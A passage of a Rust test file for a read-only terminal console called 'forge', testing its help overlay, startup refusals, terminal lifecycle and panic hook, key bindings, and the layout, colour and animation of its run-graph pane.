fn help_overlays_and_a_terminal_below_the_minimum_names_the_other_verbs() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Char('?'));
    let frame = frame_of(&tui, &views, 100, 20);
    assert!(frame.contains("read-only"), "the help says what this is");
    assert!(frame.contains("Enter"), "and names the keys: {frame}");
    apply(&mut tui, &views, Key::Char('?'));
    assert!(!tui.help, "? toggles");

    // A resize below the minimum draws ONE centred frame naming the
    // other two surfaces, and never tears the session down.
    let small = frame_of(&tui, &views, MIN_WIDTH - 1, 20);
    assert!(small.contains("too small"), "{small}");
    assert!(small.contains("forge inspect"), "{small}");
    assert!(small.contains("forge watch"), "{small}");
    let short = frame_of(&tui, &views, 100, MIN_HEIGHT - 1);
    assert!(short.contains("too small"), "{short}");
    assert!(short.contains("q or Ctrl+C quits"), "{short}");
}

// ------------------------------------------------------ AC-2: the refusals

#[test]
fn every_startup_refusal_names_both_of_the_other_readouts() {
    assert_eq!(refuse(true, (100, 40), true), None, "a real terminal");
    for refusal in [
        refuse(true, (100, 40), false),
        refuse(false, (100, 40), true),
        refuse(true, (MIN_WIDTH - 1, 40), true),
        refuse(true, (100, MIN_HEIGHT - 1), true),
    ] {
        let message = refusal.expect("a refusal");
        assert!(message.contains("forge inspect"), "{message}");
        assert!(message.contains("forge watch"), "{message}");
    }
    assert!(refuse(true, (100, 40), false)
        .unwrap()
        .contains("a read never creates one"));
    assert!(refuse(false, (100, 40), true).unwrap().contains("not one"));
    assert!(refuse(true, (10, 40), true).unwrap().contains("10×40"));
}

// ------------------------------------------- AC-12: the terminal lifecycle

/// `set_hook`/`take_hook` and the recorders below are process-global, so
/// every test that touches them takes this first.
static TERMINAL: Mutex<()> = Mutex::new(());
static SCRIPT: Mutex<Vec<Event>> = Mutex::new(Vec::new());
static ENTERED: AtomicUsize = AtomicUsize::new(0);
static LEFT: AtomicUsize = AtomicUsize::new(0);
static RESTORED: AtomicUsize = AtomicUsize::new(0);
static CHAINED: AtomicUsize = AtomicUsize::new(0);

fn script(keys: &[Key]) {
    let mut script = SCRIPT.lock().unwrap();
    script.clear();
    for key in keys {
        let code = match key {
            Key::Enter => KeyCode::Enter,
            Key::Escape => KeyCode::Esc,
            Key::Backspace => KeyCode::Backspace,
            Key::Tab => KeyCode::Tab,
            Key::Up => KeyCode::Up,
            Key::Down => KeyCode::Down,
            Key::Left => KeyCode::Left,
            Key::Right => KeyCode::Right,
            Key::PageUp => KeyCode::PageUp,
            Key::PageDown => KeyCode::PageDown,
            Key::Char(character) => KeyCode::Char(*character),
            Key::Quit => KeyCode::Char('q'),
        };
        script.push(Event::Key(KeyEvent::new(code, KeyModifiers::NONE)));
    }
}

fn scripted_poll(_: Duration) -> std::io::Result<bool> {
    Ok(!SCRIPT.lock().unwrap().is_empty())
}

fn scripted_read() -> std::io::Result<Event> {
    Ok(SCRIPT.lock().unwrap().remove(0))
}

fn record_enter() -> std::io::Result<()> {
    ENTERED.fetch_add(1, Ordering::SeqCst);
    Ok(())
}

fn record_leave() -> std::io::Result<()> {
    LEFT.fetch_add(1, Ordering::SeqCst);
    Ok(())
}

fn refuse_raw_mode() -> std::io::Result<()> {
    Err(std::io::Error::other("this terminal refuses raw mode"))
}

fn fixed_size() -> std::io::Result<(u16, u16)> {
    Ok((100, 30))
}

fn record_restore() {
    RESTORED.fetch_add(1, Ordering::SeqCst);
}

fn test_ops() -> TerminalOps {
    TerminalOps {
        enter_raw: record_enter,
        leave_raw: record_leave,
        poll: scripted_poll,
        read: scripted_read,
        size: fixed_size,
    }
}

/// A writer that always refuses: the alternate-screen error path is a
/// real closed pipe, not decoration.
struct ClosedPipe;

impl Write for ClosedPipe {
    fn write(&mut self, _: &[u8]) -> std::io::Result<usize> {
        Err(std::io::Error::other("closed pipe"))
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

#[test]
fn the_terminal_is_entered_and_left_on_every_path_including_the_error_ones() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();

    // The production ops are crossterm's own function items: this
    // constructs them without invoking one.
    let ops = production_ops();
    assert!(std::ptr::fn_addr_eq(
        ops.enter_raw,
        enable_raw_mode as fn() -> std::io::Result<()>
    ));

    // The alternate-screen sequences are real code against a real
    // writer, with no effect on this process's terminal.
    let mut sink: Vec<u8> = Vec::new();
    execute!(sink, EnterAlternateScreen, Hide).unwrap();
    let bytes = String::from_utf8(sink).unwrap();
    assert!(bytes.contains("\x1b[?1049h"), "{bytes:?}");
    assert!(bytes.contains("\x1b[?25l"), "{bytes:?}");

    // A clean run: enter, draw, quit, restore.
    let entered = ENTERED.load(Ordering::SeqCst);
    let left = LEFT.load(Ordering::SeqCst);
    script(&[Key::Quit]);
    let mut source = |_: Ask| Ok(Some(views()));
    let code = start(
        true,
        None,
        test_ops(),
        true,
        false,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        8,
    )
    .unwrap();
    assert_eq!(code, ExitCode::SUCCESS);
    assert_eq!(ENTERED.load(Ordering::SeqCst), entered + 1);
    assert_eq!(
        LEFT.load(Ordering::SeqCst),
        left + 1,
        "the guard's Drop ran"
    );

    // The error path: the alternate-screen write fails, and the guard
    // still restores BEFORE the Err reaches the caller.
    let left = LEFT.load(Ordering::SeqCst);
    let mut source = |_: Ask| Ok(Some(views()));
    let error = start(
        true,
        None,
        test_ops(),
        true,
        false,
        TestBackend::new(100, 30),
        ClosedPipe,
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(error.to_string().contains("closed pipe"), "{error}");
    assert_eq!(
        LEFT.load(Ordering::SeqCst),
        left + 1,
        "restored on the error path"
    );

    // Raw mode itself can refuse; nothing is entered and nothing leaks.
    let mut ops = test_ops();
    ops.enter_raw = refuse_raw_mode;
    let mut source = |_: Ask| Ok(Some(views()));
    let error = start(
        true,
        None,
        ops,
        true,
        false,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(error.to_string().contains("refuses raw mode"), "{error}");

    // And the startup refusal precedes every one of those effects.
    let mut source = |_: Ask| Ok(Some(views()));
    let refused = start(
        false,
        None,
        test_ops(),
        true,
        false,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(refused.to_string().contains("forge watch"), "{refused}");

    std::panic::set_hook(saved);
}

#[test]
fn the_panic_hook_restores_first_chains_second_and_is_put_back_after() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {
        CHAINED.fetch_add(1, Ordering::SeqCst);
    }));

    let restored = RESTORED.load(Ordering::SeqCst);
    let chained = CHAINED.load(Ordering::SeqCst);
    install_panic_hook(record_restore);
    let panicked = std::panic::catch_unwind(|| panic!("a deliberate panic"));
    assert!(panicked.is_err());
    assert_eq!(
        RESTORED.load(Ordering::SeqCst),
        restored + 1,
        "the terminal is restored first"
    );
    assert_eq!(
        CHAINED.load(Ordering::SeqCst),
        chained + 1,
        "and the previous hook still ran"
    );

    // Installing twice is harmless: each layer restores and chains.
    install_panic_hook(record_restore);
    let panicked = std::panic::catch_unwind(|| panic!("again"));
    assert!(panicked.is_err());
    assert_eq!(RESTORED.load(Ordering::SeqCst), restored + 3);

    let _ = std::panic::take_hook();
    std::panic::set_hook(saved);

    // The production restore is error-swallowing by construction: with
    // no terminal attached it does nothing and cannot panic.
    restore_stdout();
}

// --------------------------------------------------------- AC-9: the shell

#[test]
fn the_shell_redraws_keeps_keys_live_through_a_bad_journal_and_gives_up_at_last() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();

    // A source that answers "nothing moved" keeps the frame it has.
    script(&[Key::Down, Key::Char('r'), Key::Quit]);
    let mut answers = 0usize;
    let mut forced: Vec<bool> = Vec::new();
    let mut source = |ask: Ask| {
        answers += 1;
        forced.push(ask.force);
        match answers {
            1 => Ok(Some(views())),
            _ => Ok(None),
        }
    };
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 9).unwrap();
    assert_eq!(code, ExitCode::SUCCESS);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "the key arrived");
    assert_eq!(
        forced,
        vec![true, false, true],
        "the first frame forces, and so does `r` — nothing else does"
    );

    // A transient store error is a frame that SAYS SO, with keys still
    // live — a console the operator cannot quit for ten seconds is not
    // a console.
    script(&[Key::Char('j'), Key::Quit]);
    let mut source = |_: Ask| Err(anyhow::anyhow!("database is locked"));
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 2).unwrap();
    assert_eq!(code, ExitCode::SUCCESS, "q was handled while unreadable");
    assert!(tui
        .status
        .as_deref()
        .unwrap()
        .contains("the journal is not readable right now"));

    // A persistent one gives up past the constant `watch` already uses.
    let mut source = |_: Ask| Err(anyhow::anyhow!("database is locked"));
    let mut tui = Tui::new(None);
    let error = drive(
        &mut terminal,
        &test_ops(),
        &mut source,
        &mut tui,
        crate::WATCH_TRANSIENT_FRAMES + 2,
    )
    .unwrap_err();
    assert!(error.to_string().contains("unreadable polls"), "{error}");

    // The fleet's slower cadence is asked for on the named tick, and a
    // key that binds to nothing is simply not a key.
    SCRIPT.lock().unwrap().clear();
    SCRIPT
        .lock()
        .unwrap()
        .push(Event::Key(KeyEvent::new(KeyCode::Home, KeyModifiers::NONE)));
    let mut fleets = 0usize;
    let mut source = |ask: Ask| {
        if ask.fleet {
            fleets += 1;
        }
        Ok(Some(views()))
    };
    let mut tui = Tui::new(None);
    drive(
        &mut terminal,
        &test_ops(),
        &mut source,
        &mut tui,
        RUNS_REFRESH_TICKS + 1,
    )
    .unwrap();
    assert_eq!(fleets, 2, "once at the first frame, once on the cadence");

    std::panic::set_hook(saved);
}

#[test]
fn the_shell_asks_for_the_seats_session_only_while_that_seat_is_open() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
    script(&[
        Key::Down,
        Key::Enter,
        Key::Tab,
        Key::Down,
        Key::Enter,
        Key::Enter,
        Key::Quit,
    ]);
    let mut asked: Vec<Option<String>> = Vec::new();
    let mut source = |ask: Ask| {
        asked.push(ask.session.map(str::to_string));
        Ok(Some(views()))
    };
    let mut tui = Tui::new(None);
    drive(&mut terminal, &test_ops(), &mut source, &mut tui, 12).unwrap();
    assert!(
        asked
            .iter()
            .any(|session| session.as_deref() == Some("abcd-1234")),
        "the open seat's session id is a model field: {asked:?}"
    );
    assert!(
        asked.first().unwrap().is_none(),
        "and nothing is read before a seat is open"
    );
}

/// A panel with no sequence steps: one fork, no step label. The other
/// shape the tree draws.
fn panel_views() -> Views {
    let mut events = vec![
        ev(1, EventType::RunStarted, json!({"feature": "a panel"}), T0),
        ev(2, EventType::PhaseEntered, json!({"phase": "review"}), T0),
        ev(
            3,
            EventType::EffectRequested,
            json!({"effect_id": "eff-p", "seat": "review", "phase": "review"}),
            T0,
        ),
        ev(
            4,
            EventType::EffectStarted,
            json!({"effect_id": "eff-p", "attempt_id": "att"}),
            T0,
        ),
    ];
    for (seq, member) in [(5, "security"), (6, "correctness")] {
        events.push(ev(
            seq,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-p", "attempt_id": "att",
                   "checkpoint": {"member": member, "step": "seat-turn", "turn": 1,
                                  "tool": "Grep"}}),
            T0,
        ));
    }
    let stopped = state_of(Status::Stopped);
    Views {
        now: NOW.to_string(),
        runs: forge_view::run_rows(&[forge_view::RunEntry {
            run_id: "run-stopped",
            feature: "a run that stopped",
            created_at: T0,
            state: Some(&stopped),
        }]),
        run: Some(forge_view::run_view(&events, Some(&stopped))),
        transcript: None,
    }
}

#[test]
fn the_keys_lists_and_tints_a_console_still_needs_are_all_there() {
    let views = views();

    // Ctrl with any other key is not the quit binding.
    assert_eq!(
        from_crossterm(Event::Key(KeyEvent::new(
            KeyCode::Char('d'),
            KeyModifiers::CONTROL
        ))),
        Some(Key::Char('d'))
    );

    // `Key::Quit` is what Ctrl+C becomes, and it quits from anywhere.
    let mut tui = Tui::new(None);
    assert_eq!(apply(&mut tui, &views, Key::Quit), Flow::Quit);

    // ↑ and k move alike; an unbound letter is not a command.
    apply(&mut tui, &views, Key::Up);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "newest first");
    apply(&mut tui, &views, Key::Char('k'));
    assert_eq!(tui.cursor[0].as_deref(), Some("run-unfoldable"), "k wraps");
    let held = tui.cursor[0].clone();
    apply(&mut tui, &views, Key::Char('x'));
    assert_eq!(tui.cursor[0], held);

    // The trail is a list of its own. Enter reads the selected evidence
    // without descending to another navigation level.
    let mut tui = at_run();
    tui.pane = 2;
    let trail = keys_for(&tui, &views);
    assert!(!trail.is_empty(), "the trail lists its rows by seq");
    assert!(
        trail.len() < views.run.as_ref().unwrap().journal.len(),
        "and the checkpoints the trail hides are not in it"
    );
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Run);
    assert!(tui.scope.is_none());
    assert!(tui.reading.is_some());

    // The PARTICIPANT panes are paragraphs: no list, nothing to filter.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert!(keys_for(&tui, &views).is_empty());

    // A seat scope with the cursor elsewhere names the verb that
    // applies to THIS row, not to the scoped one.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    tui.cursor[1] = Some("eff-d".to_string());
    assert!(footer_for(&tui).contains("Enter scope seat"));
}

#[test]
fn a_filtered_fleet_a_stopped_run_a_bare_fork_and_a_whole_transcript_all_draw() {
    // A filter hides rows from the table it was typed over.
    let views = views();
    let mut tui = Tui::new(None);
    tui.filter = "run-7".to_string();
    let frame = frame_of(&tui, &views, 100, 20);
    assert!(frame.contains("run-7"));
    assert!(
        !frame.contains("run-old"),
        "the filter hides a row: {frame}"
    );

    // A stopped run and a fork with no step name: the other tone and
    // the other tree shape.
    let panel = panel_views();
    let tui = Tui::new(None);
    let frame = frame_of(&tui, &panel, 100, 20);
    assert!(frame.contains("stopped"), "{frame}");
    let tui = Tui::new(Some("run-stopped".to_string()));
    let frame = frame_of(&tui, &panel, 110, 30);
    assert!(
        frame.contains('┤') && frame.contains('├'),
        "a bare fork that rejoins: {frame}"
    );
    assert!(frame.contains("security"), "{frame}");
    assert!(frame.contains("correctness"), "{frame}");

    // A transcript that fits carries no truncation line.
    let mut views = views;
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "user".to_string(),
            ts: T0.to_string(),
            blocks: vec![crate::ui::Block {
                kind: "tool",
                text: "Read · docs/decisions/0014-interactive-tui.md".to_string(),
            }],
        }],
        false,
    ));
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("Read · docs"), "{frame}");
    assert!(!frame.contains("truncated"), "{frame}");
}

// ------------------------------------------------------- the graph pane
//
// The console's grammar in the terminal: one rail, arrowed steps, forks
// that rejoin, one name baseline, a fixed colour vocabulary, and a pulse
// that is a pure function of a tick. Geometry is asserted against the
// `Plan` — a small owned struct — rather than by substring-searching a
// rendered buffer, and the drawn frames are asserted through
// `TestBackend`.

fn gnode(label: &str, state: &str, class: &str) -> Node {
    Node {
        label: label.to_string(),
        key: format!("key:{label}"),
        state: state.to_string(),
        state_class: class.to_string(),
    }
}

fn gcolumn(label: Option<&str>, nodes: Vec<Node>) -> Column {
    Column {
        label: label.map(str::to_string),
        nodes,
    }
}

fn gphase(name: &str, visits: u64, current: bool, columns: Vec<Column>) -> Phase {
    Phase {
        name: name.to_string(),
        visits,
        current,
        plain: columns.is_empty(),
        columns,
    }
}

fn members(count: usize, class: &str) -> Vec<Node> {
    (0..count)
        .map(|index| gnode(&format!("m{index}"), "finished", class))
        .collect()
}

/// Every shape the rail draws, on one rail: a plain phase, a revisited
/// phase carrying a two-member fork with a step name and a one-member
/// step, and a plain current phase.
fn rail_phases() -> Vec<Phase> {
    vec![
        gphase("intake", 1, false, Vec::new()),
        gphase(
            "design",
            2,
            false,
            vec![
                gcolumn(
                    Some("positions"),
                    vec![
                        gnode("simplicity", "finished", "on-phosphor"),
                        gnode("robustness", "active", "in-active"),
                    ],
                ),
                gcolumn(
                    Some("review"),
                    vec![gnode("only", "finished", "on-phosphor")],
                ),
            ],
        ),
        gphase("verify", 1, true, Vec::new()),
    ]
}

/// A `Views` carrying exactly these phases and this run status, so a
/// draw case can name the shape it is asserting instead of building a
/// journal that happens to fold into it.
fn graph_views(phases: Vec<Phase>, status: &str) -> Views {
    let mut view = run_view_for("intake");
    view.phases = phases;
    match view.summary.as_mut() {
        Some(summary) => summary.status = status.to_string(),
        None => panic!("the fixture folds"),
    }
    Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(view),
        transcript: None,
    }
}

/// A `Tui` sitting on the graph pane of `run-7`.
fn at_graph() -> Tui {
    Tui::new(Some("run-7".to_string()))
}

fn text_of(lines: &[Line<'static>]) -> String {
    lines
        .iter()
        .map(|line| {
            line.spans
                .iter()
                .map(|span| span.content.as_ref())
                .collect::<String>()
        })
        .collect::<Vec<String>>()
        .join("\n")
}

// ------------------------------------------------- AC-safe-2: the widths

#[test]
fn every_graph_width_is_ratatuis_own_measurement_of_the_sanitized_text() {
    // `Safe::width()` is a char count. The rail is the first pane that
    // places its own x positions, so it is the first that can be lied to.
    assert_eq!(Safe::new("設計フェーズ").width(), 6, "six characters");
    assert_eq!(width_of("設計フェーズ"), 12, "twelve columns drawn");
    assert_eq!(width_of("intake"), 6, "and ASCII agrees with both");
    assert_eq!(
        width_of("in\u{202E}take\u{200B}\x07"),
        6,
        "measured on the SANITIZED text, so a stripped override cannot \
         claim invisible columns"
    );

    // Text is what gives way; the skeleton never is.
    assert_eq!(clamp("intake", 10), "intake");
    assert_eq!(clamp("simplicity", 6), "simpl…");
    assert_eq!(width_of(&clamp("simplicity", 6)), 6, "the clamp is exact");
    assert_eq!(clamp("設計フェーズ", 5), "設計…");
    assert_eq!(width_of(&clamp("設計フェーズ", 5)), 5);
    assert_eq!(clamp("simplicity", 0), "", "nothing fits in nothing");
    assert_eq!(clamp("a\u{202E}b", 8), "ab", "and it sanitizes on the way");

    assert_eq!(label_span(""), 0, "no text, no footprint");
    assert_eq!(label_span("ab"), 3, "one space and the text");
}

// --------------------------------- AC-look-1, AC-look-2, AC-look-3: colour

#[test]
fn the_node_vocabulary_is_a_closed_set_with_one_named_fallback() {
    for (class, still) in [
        (Class::Visited, "○"),
        (Class::Current, "●"),
        (Class::Park, "⊙"),
        (Class::Failed, "⊗"),
        (Class::Finished, "●"),
        (Class::Active, "◉"),
        (Class::Unknown, "·"),
    ] {
        let (style, ramp) = look(class);
        assert_eq!(ramp[0], still, "{class:?}'s still frame");
        assert_ne!(style, plain(), "{class:?} paints something");
    }

    // A phase's own node: the console's `phase.current × summary.status`
    // branch, transliterated.
    assert_eq!(class_for_phase(false, "running"), Class::Visited);
    assert_eq!(class_for_phase(true, "running"), Class::Current);
    assert_eq!(class_for_phase(true, "completed"), Class::Current);
    assert_eq!(class_for_phase(true, "awaiting_operator"), Class::Park);
    assert_eq!(class_for_phase(true, "stopped"), Class::Failed);
    // AC-look-2: a status outside the known set renders QUIET, never
    // live — a named divergence from `ui.html`, which falls to green.
    assert_eq!(class_for_phase(true, "reticulating"), Class::Unknown);
    assert_eq!(class_for_phase(true, ""), Class::Unknown);

    // A node inside a phase: the console's `NODE_CLASS` allowlist.
    assert_eq!(class_for_node("on-phosphor"), Class::Finished);
    assert_eq!(class_for_node("in-active"), Class::Active);
    assert_eq!(class_for_node("on-park"), Class::Park);
    assert_eq!(class_for_node("on-halt"), Class::Failed);
    assert_eq!(
        class_for_node("a class name from a journal"),
        Class::Unknown,
        "no journal string reaches this table"
    );

    // AC-look-3: active and finished differ in the GLYPH channel, so the
    // distinction survives NO_COLOR and survives animation being off.
    assert_ne!(look(Class::Active).1[0], look(Class::Finished).1[0]);
    assert_ne!(look(Class::Current).1[0], look(Class::Visited).1[0]);

    // The worst member speaks for a column drawn as one node.
    assert_eq!(
        worst(&[
            gnode("a", "finished", "on-phosphor"),
            gnode("b", "failed", "on-halt")
        ]),
        1
    );
    assert_eq!(
        worst(&[gnode("a", "x", "on-park"), gnode("b", "failed", "on-halt")]),
        1
    );
    assert_eq!(
        worst(&[
            gnode("a", "active", "in-active"),
            gnode("b", "x", "on-phosphor")
        ]),
        0,
        "a working member outranks a finished one"
    );
    assert_eq!(
        worst(&[
            gnode("a", "active", "in-active"),
            gnode("b", "x", "who knows")
        ]),
        1,
        "and an unrecognised one outranks a working one"
    );
    assert_eq!(worst(&[]), 0, "a column the derivation left empty");

    assert_eq!(
        column_label(&gcolumn(Some("positions"), members(1, "on-phosphor"))),
        "positions"
    );
    assert_eq!(
        column_label(&gcolumn(None, members(1, "on-phosphor"))),
        "m0"
    );
    assert_eq!(column_label(&gcolumn(None, Vec::new())), "");
}

// -------------------------- AC-anim-1, AC-anim-2, AC-anim-3: the pulse

#[test]
fn the_pulse_is_a_pure_total_function_of_a_tick_and_two_model_facts() {
    // A full period, and the `PULSE_TICKS` boundary inside it.
    let period: Vec<usize> = (0..8).map(|tick| pulse(tick, true, true)).collect();
    assert_eq!(period, vec![0, 0, 1, 1, 2, 2, 3, 3]);
    assert_eq!(pulse(8, true, true), 0, "and the period closes");
    assert_eq!(
        pulse(3, true, true),
        pulse(3, true, true),
        "same inputs, same frame"
    );
    // Total over `usize`, including the top of it.
    assert_eq!(pulse(usize::MAX, true, true), (usize::MAX / 2) % 4);

    // AC-anim-2 and AC-anim-3: not live, or not animating, is the still
    // frame at EVERY tick — there is no idle cost, because none was added.
    for tick in [0usize, 1, 2, 3, 7, usize::MAX] {
        assert_eq!(pulse(tick, false, true), 0, "nothing live, nothing moving");
        assert_eq!(pulse(tick, true, false), 0, "animation off is frame 0");
        assert_eq!(pulse(tick, false, false), 0);
    }
    // The named rate is a const, and the ramp it indexes has exactly
    // that many frames.
    assert_eq!(PULSE_TICKS, 2);
    assert_eq!(look(Class::Current).1.len(), PULSE_FRAMES);
}

// ------------------------------------------------- AC-mode-1: the ladder

#[test]
fn the_vertical_ladder_is_three_named_modes_and_one_predicate() {
    // Rail row, name baseline and at least one lane row on each side.
    assert_eq!(mode_for(7, 1), Mode::Full, "the 80×24 budget");
    assert_eq!(mode_for(4, 1), Mode::Full, "the floor for lanes");
    assert_eq!(mode_for(3, 1), Mode::Rail, "one row short of lanes");
    assert_eq!(mode_for(2, 3), Mode::Rail, "rail plus names, no more");
    assert_eq!(
        mode_for(9, 0),
        Mode::Rail,
        "no parallel column, no lanes to draw"
    );
    // At MIN_HEIGHT the graph pane's inner rect is about one row.
    assert_eq!(mode_for(1, 3), Mode::Compressed);
    assert_eq!(mode_for(0, 0), Mode::Compressed);

    // Member `k` of `n` sits symmetric about the rail, and an even count
    // leaves the rail row to the rail.
    let offsets = |n: usize| (0..n).map(|k| lane_offset(k, n)).collect::<Vec<isize>>();
    assert_eq!(offsets(2), vec![-1, 1]);
    assert_eq!(offsets(3), vec![-1, 0, 1]);
    assert_eq!(offsets(4), vec![-2, -1, 1, 2]);
    assert_eq!(offsets(5), vec![-2, -1, 0, 1, 2]);
}

// ------------------------------------------- AC-draw-3, AC-draw-4: the plan

#[test]
fn the_plan_is_owned_geometry_that_fits_by_construction() {
    let phases = rail_phases();
    let plan = plan(&phases, None, "running", None, None, 80, 7);
    assert_eq!(plan.mode, Mode::Full);
    assert_eq!(plan.rows, 7);
    assert_eq!(
        plan.box_row,
        Some(6),
        "the last row is reserved for the selection box's lower edge"
    );
    assert_eq!(plan.name_row, 5, "the baseline sits above the box row");
    assert_eq!(plan.rail_row, 3, "one row above the deepest lane");
    assert_eq!(plan.segments.len(), 3, "every phase is listed");

    // ONE rail: consecutive segments are separated by exactly one
    // arrowed edge, and nothing overlaps.
    for pair in plan.segments.windows(2) {
        assert_eq!(
            pair[1].x0,
            pair[0].x1 + 1 + ARROW_WIDTH,
            "one arrowed edge between steps"
        );
    }
    assert_eq!(plan.edges.len(), 3, "two between phases, one inside design");
    // Everything is inside the pane, with the elision columns reserved.
    assert!(plan.segments[0].x0 >= 1);
    assert!(plan.segments[2].x1 < plan.width - 1);
    let (from, to) = plan.rail.expect("a rail");
    assert!(from >= 1 && to < plan.width - 1);

    // The fork LEAVES the rail and REJOINS it, symmetric about the rail.
    let join = &plan.segments[1].joins[0];
    assert!(join.x1 > join.x0 + 3, "a fork spans its members");
    assert_eq!(join.rows, vec![plan.rail_row - 1, plan.rail_row + 1]);
    assert!(
        !join.on_rail,
        "an even count leaves the rail row to the rail"
    );
    assert_eq!(join.label.as_deref(), Some("positions"));
    // Its members carry the model's own classes.
    let lanes: Vec<Class> = plan.segments[1]
        .marks
        .iter()
        .filter(|mark| mark.row != plan.rail_row)
        .map(|mark| mark.class)
        .collect();
    assert_eq!(lanes, vec![Class::Finished, Class::Active]);

    // AC-draw-3: `×N` only when the phase was revisited.
    assert_eq!(plan.segments[0].name, "intake");
    assert_eq!(plan.segments[1].name, "design ×2");
    assert_eq!(plan.segments[2].name, "verify");
    // A corrupt fold cannot put twenty digits on the baseline.
    let corrupt = vec![gphase("corrupt", u64::MAX, true, Vec::new())];
    let clamped = plan_of(&corrupt, None, "running", 80, 7);
    assert_eq!(clamped.segments[0].name, "corrupt ×99+");

    // The current phase is distinguished on the baseline whether or not
    // it has a rail node of its own to fill.
    assert_eq!(plan.segments[2].class, Some(Class::Current));
    assert_eq!(plan.segments[0].class, None);

    // An empty rail is an empty plan, not an invented one.
    let empty = plan_of(&[], None, "running", 80, 7);
    assert!(empty.segments.is_empty() && empty.rail.is_none());
    assert_eq!(paint(&empty, 0, false).len(), 7, "still a frame");

    // A column the derivation left with no nodes at all.
    let hollow = vec![gphase("hollow", 1, true, vec![gcolumn(None, Vec::new())])];
    let hollow = plan_of(&hollow, None, "running", 80, 7);
    let mark = &hollow.segments[0].marks[0];
    assert_eq!(mark.class, Class::Unknown);
    assert!(!mark.live && !mark.selected);
}

/// `plan` with the two cursors left out — most geometry cases do not
/// care about them, and naming them each time buries what they do.
fn plan_of(
    phases: &[Phase],
    lens: Option<&render::Lens>,
    status: &str,
    width: usize,
    height: usize,
) -> Plan {
    plan(phases, lens, status, None, None, width, height)
}

#[test]
fn the_lens_marks_the_scoped_phase_and_hides_none_of_them() {
    let phases = rail_phases();
    let views = graph_views(rail_phases(), "running");
    let view = views.run.as_ref().unwrap();
    let lens = render::lens_for(view, Some(&render::Scope::Phase("design".to_string())))
        .unwrap()
        .unwrap();

    // AC-draw-4: `render::keeps_phase` decides the marker — the crate's
    // ONE phase predicate, called and never reimplemented.
    let marked = plan_of(&phases, Some(&lens), "running", 80, 7);
    assert_eq!(marked.segments.len(), 3, "the lens marks; it does not hide");
    assert!(marked.segments[1].name.starts_with('▸'), "the scoped one");
    assert!(!marked.segments[0].name.starts_with('▸'));
    assert!(!marked.segments[2].name.starts_with('▸'));
    // With no scope at all there is nothing to mark.
    let unmarked = plan_of(&phases, None, "running", 80, 7);
    assert!(unmarked.segments.iter().all(|seg| !seg.name.contains('▸')));

    // Every name sits on ONE baseline, by construction rather than by
    // three separate rows that happen to agree.
    let text = text_of(&paint(&marked, 0, false));
    let baseline = text.lines().nth(marked.name_row).expect("a name row");
    for name in ["intake", "▸design ×2", "verify"] {
        assert!(
            baseline.contains(name),
            "{name} on the baseline: {baseline:?}"
        );
    }
}

// ------------------------------------------------ AC-mode-2, AC-mode-3

#[test]
fn a_fork_wider_than_its_lane_budget_counts_what_it_could_not_draw() {
    // Six members with two lane rows on each side: four are drawn and
    // the two that were not are counted on the outermost lane.
    let phases = vec![gphase(
        "panel",
        1,
        true,
        vec![gcolumn(None, members(6, "on-phosphor"))],
    )];
    // Height 7: one row is the box row, one the names, one the rail,
    // leaving two lane rows a side — four of the six members.
    let plan = plan_of(&phases, None, "running", 80, 7);
    assert_eq!(plan.mode, Mode::Full);
    let join = &plan.segments[0].joins[0];
    assert_eq!(join.rows.len(), 4, "as many lanes as the budget holds");
    let labels: Vec<&str> = plan.segments[0]
        .marks
        .iter()
        .map(|mark| mark.label.as_str())
        .collect();
    assert!(
        labels.iter().any(|label| label.ends_with(" +2")),
        "no member is silently dropped: {labels:?}"
    );
    assert!(
        text_of(&paint(&plan, 0, false)).contains("+2"),
        "and the count is drawn"
    );

    // An odd count puts one member ON the rail row, and the step name
    // then yields the row it would have taken.
    let phases = vec![gphase(
        "panel",
        1,
        true,
        vec![gcolumn(Some("three"), members(3, "on-phosphor"))],
    )];
    let plan = plan_of(&phases, None, "running", 80, 8);
    let join = &plan.segments[0].joins[0];
    assert!(join.on_rail, "three members straddle the rail");
    assert_eq!(join.label, None, "a member rides the row the name wanted");
    assert!(
        text_of(&paint(&plan, 0, false)).contains('┼'),
        "and the trunk says so"
    );
}

#[test]
fn the_rail_window_is_derived_from_the_cursor_and_marks_what_it_elides() {
    let phases: Vec<Phase> = (0..8)
        .map(|index| gphase(&format!("phase-{index}"), 1, index == 0, Vec::new()))
        .collect();

    // Wide enough for the whole rail: nothing is elided.
    let whole = plan_of(&phases, None, "running", 200, 5);
    assert_eq!(whole.segments.len(), 8);
    assert!(!whole.left_elided && !whole.right_elided);

    // Narrow, with the cursor at each end and in the middle. The window
    // ALWAYS contains the cursor, and says which way the rest went.
